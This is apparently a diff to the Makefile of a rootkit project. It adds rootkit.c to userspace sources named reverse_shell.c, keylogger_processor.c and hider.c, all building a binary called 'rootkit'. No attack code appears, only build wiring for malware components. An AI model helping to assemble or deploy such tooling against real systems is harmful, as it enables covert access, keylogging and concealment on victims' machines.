@@ -14,7 +14,8 @@ USER_SRCS := \
 	src/userspace/reverse_shell.c \
 	src/userspace/keylogger_processor.c \
 	src/userspace/hider.c \
-	src/userspace/command_processor.c
+	src/userspace/command_processor.c \
+	src/userspace/rootkit.c
 
 USER_BIN := $(BUILD_DIR)/rootkit
 
